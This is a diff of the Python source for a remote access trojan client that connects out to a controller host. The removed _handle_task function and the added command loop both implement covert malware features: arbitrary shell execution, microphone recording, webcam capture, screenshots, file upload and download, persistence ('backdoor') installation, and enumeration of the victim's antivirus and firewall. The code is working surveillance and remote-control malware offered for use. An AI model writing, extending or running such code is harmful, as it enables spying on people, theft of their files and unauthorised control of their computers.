@@ -451,188 +451,6 @@ class Exploit:
 
 exploit = Exploit()
 
-def _send_task_result(conn, task_id, status, result=None, metadata=None, error=None):
-    payload = {
-        "type": "response",
-        "task_id": task_id,
-        "status": status,
-        "result": result or {},
-        "error": error,
-        "metadata": metadata or {}
-    }
-    json_send(conn, payload)
-
-
-def _handle_task(conn, task_obj):
-    if not isinstance(task_obj, dict):
-        return False
-
-    task_id = task_obj.get("task_id")
-    module = task_obj.get("module")
-    action = task_obj.get("action")
-    args = task_obj.get("args") or {}
-
-    if not module or not action:
-        return False
-
-    try:
-        if module == "notification" and action == "send":
-            send_notification(conn, args.get("title"), args.get("message"), args.get("app"))
-            _send_task_result(conn, task_id, "success", {"status": "sent"})
-            return True
-
-        if module == "geo" and action == "get":
-            try:
-                r = requests.get('https://ipinfo.io/json', timeout=10)
-                _send_task_result(conn, task_id, "success", {"data": r.text})
-            except Exception as exc:
-                _send_task_result(conn, task_id, "error", {}, error=str(exc))
-            return True
-
-        if module == "secinfo" and action == "get":
-            try:
-                info = {
-                    "Firewall": [],
-                    "Antivirus": []
-                }
-                try:
-                    c = wmi.connect(namespace="root/SecurityCenter2")
-                    firewall = c.FirewallProduct()
-                    antivirus = c.AntiVirusProduct()
-                    info["Firewall"] = [{"displayName": f.displayName, "instanceGuid": f.instanceGuid,
-                                          "pathToSignedProductExe": f.pathToSignedProductExe,
-                                          "pathToSignedReportingExe": f.pathToSignedReportingExe,
-                                          "productState": f.productState, "timestamp": f.timestamp} for f in firewall]
-                    info["Antivirus"] = [{"displayName": a.displayName, "instanceGuid": a.instanceGuid,
-                                          "pathToSignedProductExe": a.pathToSignedProductExe,
-                                          "pathToSignedReportingExe": a.pathToSignedReportingExe,
-                                          "productState": a.productState, "timestamp": a.timestamp} for a in antivirus]
-                except Exception:
-                    pass
-                _send_task_result(conn, task_id, "success", {"data": info})
-            except Exception as exc:
-                _send_task_result(conn, task_id, "error", {}, error=str(exc))
-            return True
-
-        if module == "sysinfo" and action == "get":
-            try:
-                info = {
-                    "Platform": platform.system(),
-                    "Platform Release": platform.release(),
-                    "Platform Version": platform.version(),
-                    "Architecture": platform.machine(),
-                    "Hostname": socket.gethostname(),
-                    "IP Address": socket.gethostbyname(socket.gethostname()),
-                    "Processor": platform.processor(),
-                    "Python Build": platform.python_build(),
-                    "Python Version": platform.python_version()
-                }
-                _send_task_result(conn, task_id, "success", {"data": info})
-            except Exception as exc:
-                _send_task_result(conn, task_id, "error", {}, error=str(exc))
-            return True
-
-        if module == "system" and action in ('backdoor', 'delete'):
-            try:
-                if action == 'backdoor':
-                    add_persistence(conn)
-                else:
-                    del_persistence(conn)
-                _send_task_result(conn, task_id, "success", {"status": "completed"})
-            except Exception as exc:
-                _send_task_result(conn, task_id, "error", {}, error=str(exc))
-            return True
-
-        if module == "shell" and action == "exec":
-            command = str(args.get("command", ""))
-            try:
-                if command == "exit":
-                    _send_task_result(conn, task_id, "success", {"output": "session_closed"})
-                    return True
-                if command.startswith("cd "):
-                    os.chdir(command[3:])
-                    output = os.getcwd()
-                else:
-                    proc = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-                    stdout_value, stderr_value = proc.communicate()
-                    output = (stdout_value or b"") + (stderr_value or b"")
-                    output = output.decode("utf-8", errors="replace") if isinstance(output, bytes) else str(output)
-                _send_task_result(conn, task_id, "success", {"output": output})
-            except Exception as exc:
-                _send_task_result(conn, task_id, "error", {}, error=str(exc))
-            return True
-
-        if module == "audio" and action == "record":
-            try:
-                duration = float(args.get("duration", 5))
-                fs = int(args.get("sample_rate", 44100))
-                rec = sd.rec(int(duration * fs), samplerate=fs, channels=1)
-                sd.wait()
-                wav_file = io.BytesIO()
-                wavio.write(wav_file, rec, fs, sampwidth=2)
-                payload = base64.b64encode(wav_file.getvalue()).decode('utf-8')
-                _send_task_result(conn, task_id, "success", {"data": payload})
-            except Exception as exc:
-                _send_task_result(conn, task_id, "error", {}, error=str(exc))
-            return True
-
-        if module == "camera" and action == "capture":
-            try:
-                cap = cv2.VideoCapture(0)
-                ret, frame = cap.read()
-                cap.release()
-                if ret:
-                    _, jpeg = cv2.imencode('.jpg', frame)
-                    data = base64.b64encode(jpeg.tobytes()).decode('utf-8')
-                    _send_task_result(conn, task_id, "success", {"data": data})
-                else:
-                    _send_task_result(conn, task_id, "error", {}, error="camera capture failed")
-            except Exception as exc:
-                _send_task_result(conn, task_id, "error", {}, error=str(exc))
-            return True
-
-        if module == "desktop" and action == "screenshot":
-            try:
-                screenshot = ImageGrab.grab()
-                screenshot_bytes = io.BytesIO()
-                screenshot.save(screenshot_bytes, format='PNG')
-                data = base64.b64encode(screenshot_bytes.getvalue()).decode('utf-8')
-                _send_task_result(conn, task_id, "success", {"data": data})
-            except Exception as exc:
-                _send_task_result(conn, task_id, "error", {}, error=str(exc))
-            return True
-
-        if module == "file" and action == "upload":
-            try:
-                filename = str(args.get("filename", "payload.bin"))
-                data = base64.b64decode(args.get("data", ""))
-                with open(filename, 'wb') as handle:
-                    handle.write(data)
-                _send_task_result(conn, task_id, "success", {"path": filename})
-            except Exception as exc:
-                _send_task_result(conn, task_id, "error", {}, error=str(exc))
-            return True
-
-        if module == "file" and action == "download":
-            try:
-                path = str(args.get("path", ""))
-                if not os.path.exists(path):
-                    raise FileNotFoundError(path)
-                with open(path, 'rb') as handle:
-                    data = base64.b64encode(handle.read()).decode('utf-8')
-                _send_task_result(conn, task_id, "success", {"data": data, "filename": args.get("filename", os.path.basename(path))})
-            except Exception as exc:
-                _send_task_result(conn, task_id, "error", {}, error=str(exc))
-            return True
-
-    except Exception as exc:
-        _send_task_result(conn, task_id, "error", {}, error=str(exc))
-        return True
-
-    _send_task_result(conn, task_id, "error", {}, error=f"Unsupported task: {module}:{action}")
-    return True
-
-
 def main():
     startup_executed = False
     while True:
@@ -645,51 +463,75 @@ def main():
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((HOST, PORT))
-            # send_data(s, b'UNSTAGED')
+            # if recv_command(s) != auth_code: break
+            send_data(s, b'UNSTAGED')
             while True:
                 try:
                     cmd = recv_command(s)
-                    if not cmd:
-                        continue
+                    # Support structured JSON tasks defined by api.connection_protocol.create_task
                     try:
                         task_obj = json.loads(cmd)
-                        if isinstance(task_obj, dict) and task_obj.get('type') == 'task':
-                            _handle_task(s, task_obj)
-                            continue
+                        if isinstance(task_obj, dict) and 'module' in task_obj:
+                            module = task_obj.get('module')
+                            action = task_obj.get('action')
+                            args = task_obj.get('args', {}) or {}
+                            # Map protocol tasks to existing handlers
+                            if module == 'notification' and action == 'send':
+                                send_notification(s, args.get('title'), args.get('message'), args.get('app'))
+                                continue
+                            if module == 'geo' and action == 'get':
+                                try:
+                                    r = requests.get('https://ipinfo.io/json')
+                                    json_send(s, {'result': r.text})
+                                except:
+                                    json_send(s, {'error': 'failed'})
+                                continue
+                            if module == 'secinfo' and action == 'get':
+                                get_security_info(s)
+                                continue
+                            if module == 'sysinfo' and action == 'get':
+                                get_system_info(s)
+                                continue
+                            if module == 'system' and action in ('backdoor','delete'):
+                                if action == 'backdoor':
+                                    add_persistence(s)
+                                else:
+                                    del_persistence(s)
+                                json_send(s, {'result': 'completed'})
+                                continue
+                            # Unknown structured task -> fall back to old handling
                     except Exception:
                         pass
-
-                    # if cmd == "MODE_SHELL":
-                    #     handle_shell(s)
-                    # elif cmd == "MODE_MIC":
-                    #     handle_mic(s)
-                    # elif cmd == "MODE_UPLOAD":
-                    #     handle_upload(s)
-                    # elif cmd == "MODE_CAM":
-                    #     handle_cam(s)
-                    # elif cmd == "MODE_GEO":
-                    #     handle_geo(s)
-                    # elif cmd == "MODE_REGISTER_POSTEXPLOIT":
-                    #     handle_register_post_exploit(s)
-                    # elif cmd == "MODE_START_POSTEXPLOIT":
-                    #     handle_start_post_exploit(s)
-                    # elif cmd == "MODE_BACKDOOR":
-                    #     add_persistence(s)
-                    # elif cmd == "MODE_DEL":
-                    #     del_persistence(s)
-                    # elif cmd == "MODE_NOTIFICATION":
-                    #     notification_data = json_receive(s)
-                    #     send_notification(s, notification_data["title"], notification_data["message"], notification_data["app"])
-                    # elif cmd == "MODE_SCREENSHOT":
-                    #     get_screenshot(s)
-                    # elif cmd == "MODE_SECINFO":
-                    #     get_security_info(s)
-                    # elif cmd == "MODE_SYSINFO":
-                    #     get_system_info(s)
-                except ConnectionError:
-                    break
-        except Exception:
-            pass
+                    print("CMD: " + cmd)
+                    if cmd == "MODE_SHELL":
+                        handle_shell(s)
+                    elif cmd == "MODE_MIC":
+                        handle_mic(s)
+                    elif cmd == "MODE_UPLOAD":
+                        handle_upload(s)
+                    elif cmd == "MODE_CAM":
+                        handle_cam(s)
+                    elif cmd == "MODE_GEO":
+                        handle_geo(s)
+                    elif cmd == "MODE_REGISTER_POSTEXPLOIT":
+                        handle_register_post_exploit(s)
+                    elif cmd == "MODE_START_POSTEXPLOIT":
+                        handle_start_post_exploit(s)
+                    elif cmd == "MODE_BACKDOOR":
+                        add_persistence(s)
+                    elif cmd == "MODE_DEL":
+                        del_persistence(s)
+                    elif cmd == "MODE_NOTIFICATION":
+                        notification_data = json_receive(s)
+                        send_notification(s, notification_data["title"], notification_data["message"], notification_data["app"])
+                    elif cmd == "MODE_SCREENSHOT":
+                        get_screenshot(s)
+                    elif cmd == "MODE_SECINFO":
+                        get_security_info(s)
+                    elif cmd == "MODE_SYSINFO":
+                        get_system_info(s)
+                except ConnectionError: break
+        except: pass
 
 if(use_app):
     run(filename=fileName)
